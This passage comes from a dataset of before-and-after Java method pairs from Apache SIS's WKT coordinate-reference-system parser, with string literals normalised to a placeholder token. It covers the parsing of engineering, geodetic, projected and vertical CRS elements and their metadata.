      baseCRS=parseEngineeringCRS(OPTIONAL,element,true);
      if (baseCRS == null) {
        baseCRS=parseGeodeticCRS(OPTIONAL,element,getSourceDimensions(fromBase.getMethod()),WKTKeywords.ellipsoidal);
        if (baseCRS == null) {
          baseCRS=parseProjectedCRS(MANDATORY,element,true);
        }
      }
    }
  }
  if (baseCRS == null) {
    datum=parseEngineeringDatum(MANDATORY,element,isWKT1);
  }
  try {
    final CoordinateSystem cs=parseCoordinateSystem(element,null,1,isWKT1,unit,datum);
    final Map<String,?> properties=parseMetadataAndClose(element,name,datum);
    if (baseCRS != null) {
      return crsFactory.createDerivedCRS(properties,baseCRS,fromBase,cs);
    }
    return crsFactory.createEngineeringCRS(properties,datum,cs);
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
}","/** 
 * Parses a   {@code ""EngineeringCRS""} (WKT 2) element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#74"">WKT 2 specification 11</a>. The legacy WKT 1 pattern was: {@preformat wkt}LOCAL_CS[""<name>"", <local datum>, <unit>, <axis>,  ,<axis>}* {,<authority>}] }
 * @param mode      {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent    The parent element.
 * @param isBaseCRS {@code true} if parsing the CRS inside a {@code DerivedCRS}.
 * @return The {@code ""EngineeringCRS""} element as an {@link EngineeringCRS} object.
 * @throws ParseException if the {@code ""EngineeringCRS""} element can not be parsed.
 */
private SingleCRS parseEngineeringCRS(final int mode,final Element parent,final boolean isBaseCRS) throws ParseException {
  final Element element=parent.pullElement(mode,isBaseCRS ? new String[]{WKTKeywords.BaseEngCRS} : new String[]{WKTKeywords.EngineeringCRS,WKTKeywords.EngCRS,WKTKeywords.Local_CS});
  if (element == null) {
    return null;
  }
  final boolean isWKT1=element.getKeywordIndex() == 2;
  final String name=element.pullString(""String_Node_Str"");
  final Unit<?> unit=parseUnit(element);
  EngineeringDatum datum=null;
  SingleCRS baseCRS=null;
  Conversion fromBase=null;
  if (!isWKT1 && !isBaseCRS) {
    fromBase=parseDerivingConversion(OPTIONAL,element,WKTKeywords.DerivingConversion,unit,null);
    if (fromBase != null) {
      baseCRS=parseEngineeringCRS(OPTIONAL,element,true);
      if (baseCRS == null) {
        baseCRS=parseGeodeticCRS(OPTIONAL,element,getSourceDimensions(fromBase.getMethod()),WKTKeywords.ellipsoidal);
        if (baseCRS == null) {
          baseCRS=parseProjectedCRS(MANDATORY,element,true);
        }
      }
    }
  }
  if (baseCRS == null) {
    datum=parseEngineeringDatum(MANDATORY,element,isWKT1);
  }
  try {
    final CoordinateSystem cs=parseCoordinateSystem(element,null,1,isWKT1,unit,datum);
    final Map<String,?> properties=parseMetadataAndClose(element,name,datum);
    if (baseCRS != null) {
      return crsFactory.createDerivedCRS(properties,baseCRS,fromBase,cs);
    }
    return crsFactory.createEngineeringCRS(properties,datum,cs);
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
}"
91929,"/** 
 * Parses an <strong>optional</strong> metadata elements and close. This include elements like   {@code ""SCOPE""},   {@code ""ID""} (WKT 2) or {@code ""AUTHORITY""} (WKT 1).This WKT 1 element has the following pattern: {@preformat textAUTHORITY[""<name>"", ""<code>""]}<div class=""section"">Fallback</div> The name is a mandatory property, but some invalid WKT with an empty string exist. In such case, we will use the name of the enclosed datum. Indeed, it is not uncommon to have the same name for a geographic CRS and its geodetic datum.
 * @param parent   The parent element.
 * @param name     The name of the parent object being parsed.
 * @param fallback The fallback to use if {@code name} is empty.
 * @return A properties map with the parent name and the optional authority code.
 * @throws ParseException if an element can not be parsed.
 */
@SuppressWarnings(""String_Node_Str"") private Map<String,Object> parseMetadataAndClose(final Element parent,final String name,final IdentifiedObject fallback) throws ParseException {
  properties.clear();
  properties.put(IdentifiedObject.NAME_KEY,(name.isEmpty() && fallback != null) ? fallback.getName() : name);
  Element element;
  while ((element=parent.pullElement(OPTIONAL,ID_KEYWORDS)) != null) {
    final String codeSpace=element.pullString(""String_Node_Str"");
    final String code=element.pullObject(""String_Node_Str"").toString();
    final Object version=element.pullOptional(Object.class);
    final Element citation=element.pullElement(OPTIONAL,WKTKeywords.Citation);
    final String authority;
    if (citation != null) {
      authority=citation.pullString(""String_Node_Str"");
      citation.close(ignoredElements);
    }
 else {
      authority=codeSpace;
    }
    final Element uri=element.pullElement(OPTIONAL,WKTKeywords.URI);
    if (uri != null) {
      uri.pullString(""String_Node_Str"");
      uri.close(ignoredElements);
    }
    element.close(ignoredElements);
    final ImmutableIdentifier id=new ImmutableIdentifier(Citations.fromName(authority),codeSpace,code,(version != null) ? version.toString() : null,null);
    final Object previous=properties.put(IdentifiedObject.IDENTIFIERS_KEY,id);
    if (previous != null) {
      Identifier[] identifiers;
      if (previous instanceof Identifier) {
        identifiers=new Identifier[]{(Identifier)previous,id};
      }
 else {
        identifiers=(Identifier[])previous;
        final int n=identifiers.length;
        identifiers=Arrays.copyOf(identifiers,n + 1);
        identifiers[n]=id;
      }
      properties.put(IdentifiedObject.IDENTIFIERS_KEY,identifiers);
    }
  }
  if (!parent.isEmpty()) {
    element=parent.pullElement(OPTIONAL,WKTKeywords.Scope);
    if (element != null) {
      properties.put(ReferenceSystem.SCOPE_KEY,element.pullString(""String_Node_Str""));
      element.close(ignoredElements);
    }
    DefaultExtent extent=null;
    while ((element=parent.pullElement(OPTIONAL,WKTKeywords.Area)) != null) {
      final String area=element.pullString(""String_Node_Str"");
      element.close(ignoredElements);
      if (extent == null)       extent=new DefaultExtent();
      extent.getGeographicElements().add(new DefaultGeographicDescription(area));
    }
    while ((element=parent.pullElement(OPTIONAL,WKTKeywords.BBox)) != null) {
      final double southBoundLatitude=element.pullDouble(""String_Node_Str"");
      final double westBoundLongitude=element.pullDouble(""String_Node_Str"");
      final double northBoundLatitude=element.pullDouble(""String_Node_Str"");
      final double eastBoundLongitude=element.pullDouble(""String_Node_Str"");
      element.close(ignoredElements);
      if (extent == null)       extent=new DefaultExtent();
      extent.getGeographicElements().add(new DefaultGeographicBoundingBox(westBoundLongitude,eastBoundLongitude,southBoundLatitude,northBoundLatitude));
    }
    while ((element=parent.pullElement(OPTIONAL,WKTKeywords.VerticalExtent)) != null) {
      final double minimum=element.pullDouble(""String_Node_Str"");
      final double maximum=element.pullDouble(""String_Node_Str"");
      Unit<Length> unit=parseScaledUnit(element,WKTKeywords.LengthUnit,SI.METRE);
      element.close(ignoredElements);
      if (unit == null)       unit=SI.METRE;
      if (extent == null)       extent=new DefaultExtent();
      verticalElements=new VerticalInfo(verticalElements,extent,minimum,maximum,unit).resolve(verticalCRS);
    }
    while ((element=parent.pullElement(OPTIONAL,WKTKeywords.TimeExtent)) != null) {
      if (element.peekValue() instanceof String) {
        element.pullString(""String_Node_Str"");
        element.pullString(""String_Node_Str"");
        element.close(ignoredElements);
        warning(Errors.formatInternational(Errors.Keys.UnsupportedType_1,""String_Node_Str""),null);
      }
 else {
        final Date startTime=element.pullDate(""String_Node_Str"");
        final Date endTime=element.pullDate(""String_Node_Str"");
        element.close(ignoredElements);
        try {
          final DefaultTemporalExtent t=new DefaultTemporalExtent();
          t.setBounds(startTime,endTime);
          if (extent == null)           extent=new DefaultExtent();
          extent.getTemporalElements().add(t);
        }
 catch (        UnsupportedOperationException e) {
          warning(parent,element,e);
        }
      }
    }
    element=parent.pullElement(OPTIONAL,WKTKeywords.Remark);
    if (element != null) {
      properties.put(IdentifiedObject.REMARKS_KEY,element.pullString(""String_Node_Str""));
      element.close(ignoredElements);
    }
  }
  parent.close(ignoredElements);
  return properties;
}","/** 
 * Parses an <strong>optional</strong> metadata elements and close. This include elements like   {@code ""SCOPE""},   {@code ""ID""} (WKT 2) or {@code ""AUTHORITY""} (WKT 1).This WKT 1 element has the following pattern: {@preformat wktAUTHORITY[""<name>"", ""<code>""]}<div class=""section"">Fallback</div> The name is a mandatory property, but some invalid WKT with an empty string exist. In such case, we will use the name of the enclosed datum. Indeed, it is not uncommon to have the same name for a geographic CRS and its geodetic datum.
 * @param parent   The parent element.
 * @param name     The name of the parent object being parsed.
 * @param fallback The fallback to use if {@code name} is empty.
 * @return A properties map with the parent name and the optional authority code.
 * @throws ParseException if an element can not be parsed.
 */
@SuppressWarnings(""String_Node_Str"") private Map<String,Object> parseMetadataAndClose(final Element parent,final String name,final IdentifiedObject fallback) throws ParseException {
  properties.clear();
  properties.put(IdentifiedObject.NAME_KEY,(name.isEmpty() && fallback != null) ? fallback.getName() : name);
  Element element;
  while ((element=parent.pullElement(OPTIONAL,ID_KEYWORDS)) != null) {
    final String codeSpace=element.pullString(""String_Node_Str"");
    final String code=element.pullObject(""String_Node_Str"").toString();
    final Object version=element.pullOptional(Object.class);
    final Element citation=element.pullElement(OPTIONAL,WKTKeywords.Citation);
    final String authority;
    if (citation != null) {
      authority=citation.pullString(""String_Node_Str"");
      citation.close(ignoredElements);
    }
 else {
      authority=codeSpace;
    }
    final Element uri=element.pullElement(OPTIONAL,WKTKeywords.URI);
    if (uri != null) {
      uri.pullString(""String_Node_Str"");
      uri.close(ignoredElements);
    }
    element.close(ignoredElements);
    final ImmutableIdentifier id=new ImmutableIdentifier(Citations.fromName(authority),codeSpace,code,(version != null) ? version.toString() : null,null);
    final Object previous=properties.put(IdentifiedObject.IDENTIFIERS_KEY,id);
    if (previous != null) {
      Identifier[] identifiers;
      if (previous instanceof Identifier) {
        identifiers=new Identifier[]{(Identifier)previous,id};
      }
 else {
        identifiers=(Identifier[])previous;
        final int n=identifiers.length;
        identifiers=Arrays.copyOf(identifiers,n + 1);
        identifiers[n]=id;
      }
      properties.put(IdentifiedObject.IDENTIFIERS_KEY,identifiers);
    }
  }
  if (!parent.isEmpty()) {
    element=parent.pullElement(OPTIONAL,WKTKeywords.Scope);
    if (element != null) {
      properties.put(ReferenceSystem.SCOPE_KEY,element.pullString(""String_Node_Str""));
      element.close(ignoredElements);
    }
    DefaultExtent extent=null;
    while ((element=parent.pullElement(OPTIONAL,WKTKeywords.Area)) != null) {
      final String area=element.pullString(""String_Node_Str"");
      element.close(ignoredElements);
      if (extent == null) {
        extent=new DefaultExtent(area,null,null,null);
      }
 else {
        extent.getGeographicElements().add(new DefaultGeographicDescription(area));
      }
    }
    while ((element=parent.pullElement(OPTIONAL,WKTKeywords.BBox)) != null) {
      final double southBoundLatitude=element.pullDouble(""String_Node_Str"");
      final double westBoundLongitude=element.pullDouble(""String_Node_Str"");
      final double northBoundLatitude=element.pullDouble(""String_Node_Str"");
      final double eastBoundLongitude=element.pullDouble(""String_Node_Str"");
      element.close(ignoredElements);
      if (extent == null)       extent=new DefaultExtent();
      extent.getGeographicElements().add(new DefaultGeographicBoundingBox(westBoundLongitude,eastBoundLongitude,southBoundLatitude,northBoundLatitude));
    }
    while ((element=parent.pullElement(OPTIONAL,WKTKeywords.VerticalExtent)) != null) {
      final double minimum=element.pullDouble(""String_Node_Str"");
      final double maximum=element.pullDouble(""String_Node_Str"");
      Unit<Length> unit=parseScaledUnit(element,WKTKeywords.LengthUnit,SI.METRE);
      element.close(ignoredElements);
      if (unit == null)       unit=SI.METRE;
      if (extent == null)       extent=new DefaultExtent();
      verticalElements=new VerticalInfo(verticalElements,extent,minimum,maximum,unit).resolve(verticalCRS);
    }
    while ((element=parent.pullElement(OPTIONAL,WKTKeywords.TimeExtent)) != null) {
      if (element.peekValue() instanceof String) {
        element.pullString(""String_Node_Str"");
        element.pullString(""String_Node_Str"");
        element.close(ignoredElements);
        warning(parent,element,Errors.formatInternational(Errors.Keys.UnsupportedType_1,""String_Node_Str""),null);
      }
 else {
        final Date startTime=element.pullDate(""String_Node_Str"");
        final Date endTime=element.pullDate(""String_Node_Str"");
        element.close(ignoredElements);
        try {
          final DefaultTemporalExtent t=new DefaultTemporalExtent();
          t.setBounds(startTime,endTime);
          if (extent == null)           extent=new DefaultExtent();
          extent.getTemporalElements().add(t);
        }
 catch (        UnsupportedOperationException e) {
          warning(parent,element,null,e);
        }
      }
    }
    if (extent != null) {
      properties.put(ReferenceSystem.DOMAIN_OF_VALIDITY_KEY,extent);
    }
    element=parent.pullElement(OPTIONAL,WKTKeywords.Remark);
    if (element != null) {
      properties.put(IdentifiedObject.REMARKS_KEY,element.pullString(""String_Node_Str""));
      element.close(ignoredElements);
    }
  }
  parent.close(ignoredElements);
  return properties;
}"
91930,"/** 
 * Parses a   {@code ""Method""} (WKT 2) element, followed by parameter values. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#62"">WKT 2 specification 9.3</a>. The legacy WKT 1 specification was: {@preformat text}PROJECTION[""<name>""  ,<authority>}] } Note that in WKT 2, this element is wrapped inside a   {@code Conversion} or {@code DerivingConversion}element which is itself inside the   {@code ProjectedCRS} element. This is different than WKT 1, whichputs this element right into the the  {@code ProjectedCRS} element without {@code Conversion} wrapper.
 * @param mode               {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent             The parent element.
 * @param wrapper            ""Conversion"" or ""DerivingConversion"" wrapper name, or null if parsing a WKT 1.
 * @param defaultUnit        The unit (usually linear) of the parent element, or {@code null}.
 * @param defaultAngularUnit The angular unit of the sibling {@code GeographicCRS} element, or {@code null}.
 * @return The {@code ""Method""} element and its parameters as a defining conversion.
 * @throws ParseException if the {@code ""Method""} element can not be parsed.
 */
private Conversion parseDerivingConversion(final int mode,Element parent,final String wrapper,final Unit<?> defaultUnit,final Unit<Angle> defaultAngularUnit) throws ParseException {
  final String name;
  if (wrapper == null) {
    name=null;
  }
 else {
    parent=parent.pullElement(mode,wrapper);
    if (parent == null) {
      return null;
    }
    name=parent.pullString(""String_Node_Str"");
  }
  final OperationMethod method=parseMethod(parent,WKTKeywords.Method,WKTKeywords.Projection);
  Map<String,?> properties=this.properties;
  final ParameterValueGroup parameters=method.getParameters().createValue();
  parseParameters(parent,parameters,defaultUnit,defaultAngularUnit);
  if (wrapper != null) {
    properties=parseMetadataAndClose(parent,name,method);
  }
  try {
    return opFactory.createDefiningConversion(properties,method,parameters);
  }
 catch (  FactoryException exception) {
    throw parent.parseFailed(exception);
  }
}","/** 
 * Parses a   {@code ""Method""} (WKT 2) element, followed by parameter values. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#62"">WKT 2 specification 9.3</a>. The legacy WKT 1 specification was: {@preformat wkt}PROJECTION[""<name>""  ,<authority>}] } Note that in WKT 2, this element is wrapped inside a   {@code Conversion} or {@code DerivingConversion}element which is itself inside the   {@code ProjectedCRS} element. This is different than WKT 1, whichputs this element right into the the  {@code ProjectedCRS} element without {@code Conversion} wrapper.
 * @param mode               {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent             The parent element.
 * @param wrapper            ""Conversion"" or ""DerivingConversion"" wrapper name, or null if parsing a WKT 1.
 * @param defaultUnit        The unit (usually linear) of the parent element, or {@code null}.
 * @param defaultAngularUnit The angular unit of the sibling {@code GeographicCRS} element, or {@code null}.
 * @return The {@code ""Method""} element and its parameters as a defining conversion.
 * @throws ParseException if the {@code ""Method""} element can not be parsed.
 */
private Conversion parseDerivingConversion(final int mode,Element parent,final String wrapper,final Unit<?> defaultUnit,final Unit<Angle> defaultAngularUnit) throws ParseException {
  final String name;
  if (wrapper == null) {
    name=null;
  }
 else {
    parent=parent.pullElement(mode,wrapper);
    if (parent == null) {
      return null;
    }
    name=parent.pullString(""String_Node_Str"");
  }
  final OperationMethod method=parseMethod(parent,WKTKeywords.Method,WKTKeywords.Projection);
  Map<String,?> properties=this.properties;
  final ParameterValueGroup parameters=method.getParameters().createValue();
  parseParameters(parent,parameters,defaultUnit,defaultAngularUnit);
  if (wrapper != null) {
    properties=parseMetadataAndClose(parent,name,method);
  }
  try {
    return opFactory.createDefiningConversion(properties,method,parameters);
  }
 catch (  FactoryException exception) {
    throw parent.parseFailed(exception);
  }
}"
91931,"/** 
 * Parses a   {@code ""GeodeticCRS""} (WKT 2) element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#49"">WKT 2 specification 8</a>. The legacy WKT 1 specification had two elements for this: {@preformat text}GEOGCS[""<name>"", <datum>, <prime meridian>, <angular unit>   ,<twin axes>} {,<authority>}] } and  {@preformat text}GEOCCS[""<name>"", <datum>, <prime meridian>, <linear unit>  ,<axis> ,<axis> ,<axis>} {,<authority>}] }
 * @param mode      {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent    The parent element.
 * @param dimension The minimal number of dimensions (usually 2).
 * @param csType    The default coordinate system type, or {@code null} if unknown.Should be non-null only when parsing a  {@link GeneralDerivedCRS#getBaseCRS()} component.
 * @return The {@code ""GeodeticCRS""} element as a {@link GeographicCRS} or {@link GeocentricCRS} object.
 * @throws ParseException if the {@code ""GeodeticCRS""} element can not be parsed.
 * @see org.apache.sis.referencing.crs.DefaultGeographicCRS#formatTo(Formatter)
 * @see org.apache.sis.referencing.crs.DefaultGeocentricCRS#formatTo(Formatter)
 */
private SingleCRS parseGeodeticCRS(final int mode,final Element parent,int dimension,String csType) throws ParseException {
  final Element element=parent.pullElement(mode,(csType != null) ? new String[]{WKTKeywords.BaseGeodCRS,WKTKeywords.GeogCS} : new String[]{WKTKeywords.GeodeticCRS,WKTKeywords.GeogCS,WKTKeywords.GeodCRS,WKTKeywords.GeocCS});
  if (element == null) {
    return null;
  }
  final boolean isWKT1;
  Unit<?> csUnit;
  Unit<Angle> angularUnit;
switch (element.getKeywordIndex()) {
default :
{
      isWKT1=false;
      csUnit=parseUnit(element);
      if (Units.isAngular(csUnit)) {
        angularUnit=csUnit.asType(Angle.class);
      }
 else {
        angularUnit=NonSI.DEGREE_ANGLE;
        if (csUnit == null) {
          if (WKTKeywords.ellipsoidal.equals(csType)) {
            csUnit=NonSI.DEGREE_ANGLE;
          }
        }
      }
      break;
    }
case 1:
{
    isWKT1=true;
    csType=WKTKeywords.ellipsoidal;
    angularUnit=parseScaledUnit(element,WKTKeywords.AngleUnit,SI.RADIAN);
    csUnit=angularUnit;
    dimension=2;
    break;
  }
case 3:
{
  isWKT1=true;
  csType=WKTKeywords.Cartesian;
  angularUnit=NonSI.DEGREE_ANGLE;
  csUnit=parseScaledUnit(element,WKTKeywords.LengthUnit,SI.METRE);
  dimension=3;
  break;
}
}
final String name=element.pullString(""String_Node_Str"");
SingleCRS baseCRS=null;
Conversion fromBase=null;
if (!isWKT1 && csType == null) {
fromBase=parseDerivingConversion(OPTIONAL,element,WKTKeywords.DerivingConversion,csUnit,angularUnit);
if (fromBase != null) {
baseCRS=parseGeodeticCRS(MANDATORY,element,getSourceDimensions(fromBase.getMethod()),WKTKeywords.ellipsoidal);
}
}
final CoordinateSystem cs;
try {
cs=parseCoordinateSystem(element,csType,dimension,isWKT1,csUnit,null);
if (baseCRS != null) {
final Map<String,?> properties=parseMetadataAndClose(element,name,null);
return crsFactory.createDerivedCRS(properties,baseCRS,fromBase,cs);
}
angularUnit=AxisDirections.getAngularUnit(cs,angularUnit);
final PrimeMeridian meridian=parsePrimeMeridian(OPTIONAL,element,isWKT1,angularUnit);
final GeodeticDatum datum=parseDatum(MANDATORY,element,meridian);
final Map<String,?> properties=parseMetadataAndClose(element,name,datum);
if (cs instanceof EllipsoidalCS) {
return crsFactory.createGeographicCRS(properties,datum,(EllipsoidalCS)cs);
}
if (cs instanceof CartesianCS) {
return crsFactory.createGeocentricCRS(properties,datum,referencing.upgradeGeocentricCS((CartesianCS)cs));
}
if (cs instanceof SphericalCS) {
return crsFactory.createGeocentricCRS(properties,datum,(SphericalCS)cs);
}
}
 catch (FactoryException exception) {
throw element.parseFailed(exception);
}
throw element.illegalCS(cs);
}","/** 
 * Parses a   {@code ""GeodeticCRS""} (WKT 2) element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#49"">WKT 2 specification 8</a>. The legacy WKT 1 specification had two elements for this: {@preformat wkt}GEOGCS[""<name>"", <datum>, <prime meridian>, <angular unit>   ,<twin axes>} {,<authority>}] } and  {@preformat wkt}GEOCCS[""<name>"", <datum>, <prime meridian>, <linear unit>  ,<axis> ,<axis> ,<axis>} {,<authority>}] }
 * @param mode      {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent    The parent element.
 * @param dimension The minimal number of dimensions (usually 2).
 * @param csType    The default coordinate system type, or {@code null} if unknown.Should be non-null only when parsing a  {@link GeneralDerivedCRS#getBaseCRS()} component.
 * @return The {@code ""GeodeticCRS""} element as a {@link GeographicCRS} or {@link GeocentricCRS} object.
 * @throws ParseException if the {@code ""GeodeticCRS""} element can not be parsed.
 * @see org.apache.sis.referencing.crs.DefaultGeographicCRS#formatTo(Formatter)
 * @see org.apache.sis.referencing.crs.DefaultGeocentricCRS#formatTo(Formatter)
 */
private SingleCRS parseGeodeticCRS(final int mode,final Element parent,int dimension,String csType) throws ParseException {
  final Element element=parent.pullElement(mode,(csType != null) ? new String[]{WKTKeywords.BaseGeodCRS,WKTKeywords.GeogCS} : new String[]{WKTKeywords.GeodeticCRS,WKTKeywords.GeogCS,WKTKeywords.GeodCRS,WKTKeywords.GeocCS});
  if (element == null) {
    return null;
  }
  final boolean isWKT1;
  Unit<?> csUnit;
  Unit<Angle> angularUnit;
switch (element.getKeywordIndex()) {
default :
{
      isWKT1=false;
      csUnit=parseUnit(element);
      if (Units.isAngular(csUnit)) {
        angularUnit=csUnit.asType(Angle.class);
      }
 else {
        angularUnit=NonSI.DEGREE_ANGLE;
        if (csUnit == null) {
          if (WKTKeywords.ellipsoidal.equals(csType)) {
            csUnit=NonSI.DEGREE_ANGLE;
          }
        }
      }
      break;
    }
case 1:
{
    isWKT1=true;
    csType=WKTKeywords.ellipsoidal;
    angularUnit=parseScaledUnit(element,WKTKeywords.AngleUnit,SI.RADIAN);
    csUnit=angularUnit;
    dimension=2;
    break;
  }
case 3:
{
  isWKT1=true;
  csType=WKTKeywords.Cartesian;
  angularUnit=NonSI.DEGREE_ANGLE;
  csUnit=parseScaledUnit(element,WKTKeywords.LengthUnit,SI.METRE);
  dimension=3;
  break;
}
}
final String name=element.pullString(""String_Node_Str"");
SingleCRS baseCRS=null;
Conversion fromBase=null;
if (!isWKT1 && csType == null) {
fromBase=parseDerivingConversion(OPTIONAL,element,WKTKeywords.DerivingConversion,csUnit,angularUnit);
if (fromBase != null) {
baseCRS=parseGeodeticCRS(MANDATORY,element,getSourceDimensions(fromBase.getMethod()),WKTKeywords.ellipsoidal);
}
}
final CoordinateSystem cs;
try {
cs=parseCoordinateSystem(element,csType,dimension,isWKT1,csUnit,null);
if (baseCRS != null) {
final Map<String,?> properties=parseMetadataAndClose(element,name,null);
return crsFactory.createDerivedCRS(properties,baseCRS,fromBase,cs);
}
angularUnit=AxisDirections.getAngularUnit(cs,angularUnit);
final PrimeMeridian meridian=parsePrimeMeridian(OPTIONAL,element,isWKT1,angularUnit);
final GeodeticDatum datum=parseDatum(MANDATORY,element,meridian);
final Map<String,?> properties=parseMetadataAndClose(element,name,datum);
if (cs instanceof EllipsoidalCS) {
return crsFactory.createGeographicCRS(properties,datum,(EllipsoidalCS)cs);
}
if (cs instanceof CartesianCS) {
return crsFactory.createGeocentricCRS(properties,datum,referencing.upgradeGeocentricCS((CartesianCS)cs));
}
if (cs instanceof SphericalCS) {
return crsFactory.createGeocentricCRS(properties,datum,(SphericalCS)cs);
}
}
 catch (FactoryException exception) {
throw element.parseFailed(exception);
}
throw element.illegalCS(cs);
}"
91932,"/** 
 * Parses a   {@code ""ProjectedCRS""} (WKT 2) element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#57"">WKT 2 specification 9</a>. The legacy WKT 1 specification was: {@preformat text}PROJCS[""<name>"", <geographic cs>, <projection>,  <parameter>,}*, <linear unit> {,<twin axes>}{,<authority>}] }
 * @param mode      {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent    The parent element.
 * @param isBaseCRS {@code true} if parsing the CRS inside a {@code DerivedCRS}.
 * @return The {@code ""ProjectedCRS""} element as a {@link ProjectedCRS} object.
 * @throws ParseException if the {@code ""ProjectedCRS""} element can not be parsed.
 */
private ProjectedCRS parseProjectedCRS(final int mode,final Element parent,final boolean isBaseCRS) throws ParseException {
  final Element element=parent.pullElement(mode,isBaseCRS ? new String[]{WKTKeywords.BaseProjCRS} : new String[]{WKTKeywords.ProjectedCRS,WKTKeywords.ProjCRS,WKTKeywords.ProjCS});
  if (element == null) {
    return null;
  }
  final boolean isWKT1=element.getKeywordIndex() == 2;
  final String name=element.pullString(""String_Node_Str"");
  final SingleCRS geoCRS=parseGeodeticCRS(MANDATORY,element,2,WKTKeywords.ellipsoidal);
  if (!(geoCRS instanceof GeographicCRS)) {
    throw new LocalizedParseException(errorLocale,Errors.Keys.IllegalCRSType_1,new Object[]{geoCRS.getClass()},element.offset);
  }
  Unit<Length> csUnit=parseScaledUnit(element,WKTKeywords.LengthUnit,SI.METRE);
  final Unit<Length> linearUnit;
  final Unit<Angle> angularUnit;
  if (isWKT1 && usesCommonUnits) {
    linearUnit=SI.METRE;
    angularUnit=NonSI.DEGREE_ANGLE;
  }
 else {
    linearUnit=csUnit;
    angularUnit=AxisDirections.getAngularUnit(geoCRS.getCoordinateSystem(),NonSI.DEGREE_ANGLE);
  }
  final Conversion conversion=parseDerivingConversion(MANDATORY,element,isWKT1 ? null : WKTKeywords.Conversion,linearUnit,angularUnit);
  if (csUnit == null && isBaseCRS) {
    csUnit=SI.METRE;
  }
  final CoordinateSystem cs;
  try {
    cs=parseCoordinateSystem(element,WKTKeywords.Cartesian,2,isWKT1,csUnit,geoCRS.getDatum());
    final Map<String,?> properties=parseMetadataAndClose(element,name,conversion);
    if (cs instanceof CartesianCS) {
      return crsFactory.createProjectedCRS(properties,(GeographicCRS)geoCRS,conversion,(CartesianCS)cs);
    }
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
  throw element.illegalCS(cs);
}","/** 
 * Parses a   {@code ""ProjectedCRS""} (WKT 2) element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#57"">WKT 2 specification 9</a>. The legacy WKT 1 specification was: {@preformat wkt}PROJCS[""<name>"", <geographic cs>, <projection>,  <parameter>,}*, <linear unit> {,<twin axes>}{,<authority>}] }
 * @param mode      {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent    The parent element.
 * @param isBaseCRS {@code true} if parsing the CRS inside a {@code DerivedCRS}.
 * @return The {@code ""ProjectedCRS""} element as a {@link ProjectedCRS} object.
 * @throws ParseException if the {@code ""ProjectedCRS""} element can not be parsed.
 */
private ProjectedCRS parseProjectedCRS(final int mode,final Element parent,final boolean isBaseCRS) throws ParseException {
  final Element element=parent.pullElement(mode,isBaseCRS ? new String[]{WKTKeywords.BaseProjCRS} : new String[]{WKTKeywords.ProjectedCRS,WKTKeywords.ProjCRS,WKTKeywords.ProjCS});
  if (element == null) {
    return null;
  }
  final boolean isWKT1=element.getKeywordIndex() == 2;
  final String name=element.pullString(""String_Node_Str"");
  final SingleCRS geoCRS=parseGeodeticCRS(MANDATORY,element,2,WKTKeywords.ellipsoidal);
  if (!(geoCRS instanceof GeographicCRS)) {
    throw new LocalizedParseException(errorLocale,Errors.Keys.IllegalCRSType_1,new Object[]{geoCRS.getClass()},element.offset);
  }
  Unit<Length> csUnit=parseScaledUnit(element,WKTKeywords.LengthUnit,SI.METRE);
  final Unit<Length> linearUnit;
  final Unit<Angle> angularUnit;
  if (isWKT1 && usesCommonUnits) {
    linearUnit=SI.METRE;
    angularUnit=NonSI.DEGREE_ANGLE;
  }
 else {
    linearUnit=csUnit;
    angularUnit=AxisDirections.getAngularUnit(geoCRS.getCoordinateSystem(),NonSI.DEGREE_ANGLE);
  }
  final Conversion conversion=parseDerivingConversion(MANDATORY,element,isWKT1 ? null : WKTKeywords.Conversion,linearUnit,angularUnit);
  if (csUnit == null && isBaseCRS) {
    csUnit=SI.METRE;
  }
  final CoordinateSystem cs;
  try {
    cs=parseCoordinateSystem(element,WKTKeywords.Cartesian,2,isWKT1,csUnit,geoCRS.getDatum());
    final Map<String,?> properties=parseMetadataAndClose(element,name,conversion);
    if (cs instanceof CartesianCS) {
      return crsFactory.createProjectedCRS(properties,(GeographicCRS)geoCRS,conversion,(CartesianCS)cs);
    }
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
  throw element.illegalCS(cs);
}"
91933,"/** 
 * Parses a   {@code ""VerticalDatum""} (WKT 2) element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#71"">WKT 2 specification 10.2</a>. The legacy WKT 1 pattern was: {@preformat text}VERT_DATUM[""<name>"", <datum type>  ,<authority>}] }
 * @param mode   {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @param isWKT1 {@code true} if the parent is a WKT 1 element.
 * @return The {@code ""VerticalDatum""} element as a {@link VerticalDatum} object.
 * @throws ParseException if the {@code ""VerticalDatum""} element can not be parsed.
 */
private VerticalDatum parseVerticalDatum(final int mode,final Element parent,final boolean isWKT1) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.VerticalDatum,WKTKeywords.VDatum,WKTKeywords.Vert_Datum);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  VerticalDatumType type=null;
  if (isWKT1) {
    type=VerticalDatumTypes.fromLegacy(element.pullInteger(""String_Node_Str""));
  }
  if (type == null) {
    type=VerticalDatumTypes.guess(name,null,null);
  }
  try {
    return datumFactory.createVerticalDatum(parseAnchorAndClose(element,name),type);
  }
